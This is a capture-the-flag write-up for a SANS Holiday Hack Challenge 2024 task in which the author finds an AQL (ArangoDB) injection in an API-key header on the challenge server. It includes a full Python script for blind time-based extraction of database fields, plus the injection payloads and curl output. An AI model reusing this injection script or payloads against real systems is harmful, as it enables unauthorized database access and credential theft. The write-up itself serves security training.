---
title: Deactivate Frostbit Naughty-Nice List Publication
author: thedead91
tags:
  - SANS Holiday Hack Challenge 2024
  - Holiday Hack Challenge
  - Holiday Hack Challenge 2024
  - Snow-maggedon

  - act3
  
  - Deactivate Frostbit Naughty-Nice List Publication
  - Deactivate
  - Dusty Giftwrap
categories:
  - SANS Holiday Hack Challenge 2024
  - SANS Holiday Hack Challenge 2024 - Act 3
date: 2025-01-03 15:00:00
description: Wombley's ransomware server is threatening to publish the Naughty-Nice list. Find a way to deactivate the publication of the Naughty-Nice list by the ransomware server.
---

Difficulty: <span style="color:red">❄ ❄ ❄ ❄ ❄</span>  
Wombley's ransomware server is threatening to publish the Naughty-Nice list. Find a way to deactivate the publication of the Naughty-Nice list by the ransomware server.

## Hints
### Frostbit Publication
*From: Dusty Giftwrap*
There must be a way to deactivate the ransomware server's data publication. Perhaps one of the other North Pole assets revealed something that could help us find the deactivation path. If so, we might be able to trick the Frostbit infrastructure into revealing more details.
### Frostbit Slumber
*From: Dusty Giftwrap*
The Frostbit author may have mitigated the use of certain characters, verbs, and simple authentication bypasses, leaving us **blind** in this case. Therefore, we might need to trick the application into responding differently based on our input and measure its response. If we know the underlying technology used for data storage, we can replicate it locally using Docker containers, allowing us to develop and test techniques and payloads with greater insight into how the application functions.

## Solution
The base URL from the "Decrypt the Naughty-Nice List" challenge (https://api.frostbit.app), also the UUID will be the same, in my case 3da17f67-ee61-455d-afc2-aa20e8c7911e.
Additionally, one of the messages in `frostbitfeed` Santa Vision challenge provides a useful hint for this challenge: 
`Error msg: Unauthorized access attempt. /api/v1/frostbitadmin/bot/<botuuid>/deactivate, authHeader: X-API-Key, status: Invalid Key, alert: Warning, recipient: Wombley`.

Starting with these information and trying to append the `debug` parameter to the url, we can observe the behavior of the API:
```bash
(act3-ransomware) thedead@maccos act3-ransomware % curl "https://api.frostbit.app//api/v1/frostbitadmin/bot/3da17f67-ee61-455d-afc2-aa20e8c7911e/deactivate?debug=true" -H "X-API-Key: asd"
{"debug":true,"error":"Invalid Key"}
```
Attempting common attack patterns we can observe a SQL-injection like behavior:
```bash
(act3-ransomware) thedead@maccos act3-ransomware % curl "https://api.frostbit.app//api/v1/frostbitadmin/bot/3da17f67-ee61-455d-afc2-aa20e8c7911e/deactivate?debug=true" -H "X-API-Key: '"  
{"debug":true,"error":"Timeout or error in query:\nFOR doc IN config\n    FILTER doc.<key_name_omitted> == '{user_supplied_x_api_key}'\n    <other_query_lines_omitted>\n    RETURN doc"}
```

Not knowing this specific syntax, I resorted to ChatGPT which revealed I was dealing with AQL (ArangoDB Query Language). Not being familiar with this NoSQL database technology, I spent some time finding a proper query and eventually ended up with a reliable blind injection in the form of `' || <PAYLOAD>?SLEEP(1000):false || '`. I then wrote a python script to automate the attack and extract the data I was after:
```python
import requests
import logging
import time
import json

logging.basicConfig()

BASE_URL     = "https://api.frostbit.app/api/v1/frostbitadmin/bot/3da17f67-ee61-455d-afc2-aa20e8c7911e/deactivate?debug=true"
BASE_QUERY   = "' || {}?SLEEP(1000):false || '"
HEADER       = "X-API-Key"
OK_MSG       = 'Timeout or error in query:'

INT_RETRY_THRESHOLD = 100
HEX_ALPHABET = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f"]

LOG_LEVEL    = logging.INFO

logger       = logging.getLogger("")

def runBlind (query):
  query = BASE_QUERY.format(query)
  headers = {"X-API-Key":query}

  start = time.perf_counter()
  response = requests.get(BASE_URL, headers = headers)
  request_time = time.perf_counter() - start

  logger.debug ("runBlind --> Query: {}".format(query))
  logger.debug ("runBlind --> response.text: {}".format(repr(response.text)))
  logger.debug ("runBlind --> Query took {} seconds".format(request_time))
  if OK_MSG in response.text:
    logger.debug ("runBlind --> Success")
    return True
  else:
    logger.debug ("runBlind --> Failed")
    return False

def runIntBlind (query):
  tresholdTriggered = False
  i = 0
  while True:
    _query = "{}=={}".format(query,i)
    logger.debug ("runIntBlind --> {}".format(i))
    result = runBlind(_query)
    if tresholdTriggered:
      result = result or runBlind(_query)
    if result:
      logger.debug ("runIntBlind --> Return {}".format(i))
      return i
    if i > INT_RETRY_THRESHOLD:
      logger.debug ("runIntBlind --> Counter over threshold, restarting with increased retries")
      i = -1
    i += 1

def runHexBlind (query):
  query = "TO_HEX({})".format(query)

  _query = "LENGTH({})".format(query)
  length = runIntBlind (_query)
  logger.debug ("runHexBlind --> Lenght is {}".format(length))

  hexString = ""
  for i in range (0, length):
    found = False
    j = 0
    while not found:
      hexChar = HEX_ALPHABET[j % len(HEX_ALPHABET)]
      _query = 'SUBSTRING({},{},1)=="{}"'.format(query, i, hexChar)
      if runBlind (_query):
        hexString += hexChar
        found = True
        logger.debug ("runHexBlind --> Current hex string is {}".format(hexString))
      j += 1
  string = bytes.fromhex(hexString).decode("ASCII")
  logger.debug("runHexBlind --> Got {} [{}]".format(string, hexString))
  return string

def getCols ():
  query = "ATTRIBUTES(doc)"
  cols = json.loads(runHexBlind (query))
  logger.debug("getCols --> cols is {}".format(cols))
  return cols

def getNumberOfCols ():
  query = "COUNT(doc)"
  numberOfCols = runIntBlind (query)
  return numberOfCols

def getColsValues (cols):
  table = {}
  for col in cols:
    query = "doc.{}".format(col)
    colValue = runHexBlind(query)
    table[col] = colValue
  return table

def main ():
  print ("### Setup ###")
  print ("Base URL                 : {}".format(BASE_URL))
  print ("Base Query               : {}".format(BASE_QUERY))
  print ("Headers to inject        : {}".format(HEADER))
  print ("OK message               : {}".format(OK_MSG))
  print ("Log level                : {}".format(LOG_LEVEL))
  print ("### Run ###")

  logger.setLevel(LOG_LEVEL)

  print ("Retrieving the number of columns")
  numberOfCols = getNumberOfCols()
  print (" --> Got {} columns".format(numberOfCols))
  print ("Retrieving the columns")
  cols = getCols()
  print (" --> The columns are {}".format(cols))
  print ("Retrieving the values")
  colsValues = getColsValues (cols)
  print (" --> The values are {}".format(colsValues))

if __name__ == "__main__":
  main()
```
The script performs a time based injection but relies on the error returned to verify the actual result as the API automatically times out after 2 seconds. I went for this approach as I have seen instances of the query performing faster but still returning the error. Running the script returned the data from the database:
```bash
(act3-ransomware) thedead@maccos act3-ransomware % python3 aql_blind.py
### Setup ###
Base URL                 : https://api.frostbit.app/api/v1/frostbitadmin/bot/3da17f67-ee61-455d-afc2-aa20e8c7911e/deactivate?debug=true
Base Query               : ' || {}?SLEEP(1000):false || '
Headers to inject        : X-API-Key
OK message               : Timeout or error in query:
Log level                : 20
### Run ###
Retrieving the number of columns
 --> Got 4 columns
Retrieving the columns
 --> The columns are ['deactivate_api_key', '_rev', '_key', '_id']
Retrieving the values
 --> The values are {'deactivate_api_key': 'abe7a6ad-715e-4e6a-901b-c9279a964f91', '_rev': '_ieE_hFC---', '_key': 'config', '_id': 'config/config'}
```

Calling the deactivate endpoint with `X-API-Key: abe7a6ad-715e-4e6a-901b-c9279a964f91` did the trick and deactivated the ransomware publication:
```bash
(act3-ransomware) thedead@maccos act3-ransomware % curl "https://api.frostbit.app//api/v1/frostbitadmin/bot/3da17f67-ee61-455d-afc2-aa20e8c7911e/deactivate?debug=true" -H "X-API-Key: abe7a6ad-715e-4e6a-901b-c9279a964f91"
{"message":"Response status code: 200, Response body: {\"result\":\"success\",\"rid\":\"3da17f67-ee61-455d-afc2-aa20e8c7911e\",\"hash\":\"50fca4bc7248f1fcdb35131bef14968b1101b03b93435a8421c4a215b3047f9a\",\"uid\":\"5001\"}\nPOSTED WIN RESULTS FOR RID 3da17f67-ee61-455d-afc2-aa20e8c7911e","status":"Deactivated"}
```